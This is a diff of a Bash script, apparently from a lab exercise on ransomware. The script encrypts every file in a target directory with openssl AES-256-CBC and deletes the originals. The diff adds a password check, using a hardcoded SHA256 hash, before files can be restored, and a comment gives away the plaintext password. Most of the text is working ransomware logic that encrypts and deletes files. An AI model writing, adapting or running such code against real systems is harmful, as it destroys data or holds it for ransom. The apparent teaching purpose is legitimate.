@@ -6,6 +6,8 @@
 # Variables
 DIR="/home/kali/paquito"                   # Directory to encrypt
 KEY="key.txt"                # Name of the text file with the key
+PASSWORD_HASH=007cb94b641101dfe2f06b0c1017b70588a893af4546b3645d5a40db42e08b0d # SHA256 hash of the password
+#$(echo -n "coffe" | sha256sum | cut -d " " -f1) # SHA256 hash of the password
 
 # Function
 
@@ -17,10 +19,8 @@ function generateKey(){
 }
 
 # Encrypt the files
-
 function encrypt(){
     echo "Encriptando..."
-    # Use find comand to find files and directories in /etc excluding /etc/passwd, /etc/shadow, /etc/sudoers and /etc/hosts
     find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
         openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -kfile "$HOME/$KEY" # Encrypt the file
         rm "$file"                                    # Delete the original file
@@ -30,6 +30,13 @@ function encrypt(){
 
 # Restore files from encrypted files
 function restore(){
+    echo "Enter password:"
+    read -s entered_password
+    entered_password_hash=$(echo -n "$entered_password" | sha256sum | cut -d " " -f1)
+    if [ "$entered_password_hash" != "$PASSWORD_HASH" ]; then
+        echo "Incorrect password"
+        exit 1
+    fi
     echo "Restaurando backup..."
     find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
         openssl enc -aes-256-cbc -d -in "$file" -out "${file%.enc}" -kfile "$HOME/$KEY" # Decrypt the file
@@ -67,5 +74,3 @@ case $1 in
         help
         ;;
 esac
-
-## 3.2.2. Ransomware
